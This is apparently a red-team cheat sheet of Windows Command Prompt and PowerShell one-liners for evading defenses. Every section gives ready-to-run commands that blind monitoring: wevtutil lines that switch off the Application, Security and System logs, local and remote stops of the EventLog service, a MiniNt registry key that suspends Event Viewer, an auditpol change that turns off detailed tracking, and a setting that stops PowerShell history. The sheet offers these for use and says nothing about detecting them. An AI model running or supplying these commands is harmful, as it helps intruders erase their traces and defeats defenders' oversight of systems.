# Living off the Land

## 01 - Command Prompt

Disable specific logs.

```
C:\> wevtutil.exe sl Application /e:false

wevtutil.exe sl Security /e:false

wevtutil.exe sl System /e:false
```

Disable the event log service.

```
C:\> net.exe stop EventLog
```

Suspend **Event Viewer** from generating logs

```
C:\> reg.exe add "[\\<IP>\]HKLM\System\CurrentControlSet\Control\MiniNt" /f
```

Disable detailed tracking.

```
C:\> auditpol.exe /get /category:"Detailed Tracking"

C:\> auditpol.exe /set /category:"Detailed Tracking" /success:disable /failure:disable
```

## 02 - PowerShell

Disable history commands.

```
PS C:\> Set-PSReadLineOption -HistorySaveStyle SaveNothing
```

Disable the event log service.

```
PS C:\> Stop-Service -Force -Name "EventLog"

PS C:\> Get-Service [-ComputerName <IP>] -Name "EventLog" | Stop-Service -Force

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { Stop-Service -Force -Name "EventLog" }
```

Suspend Event Viewer from generating logs

```
PS C:\> New-Item -Path Registry::HKLM:\System\CurrentControlSet\Control\MiniNt" -Force
```

---
## References

### LOFLCAB

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

### r00t 3xp10it

- [r00t-3xp10it: CmdLine Scripts for Reverse TCP Shell Addicts](https://github.com/r00t-3xp10it/venom/wiki/CmdLine-%26-Scripts-for-reverse-TCP-shell-addicts)

### DMCXBlue

- [DMCXBlue: Impair Command History Logging](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/impair-command-history-logging)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)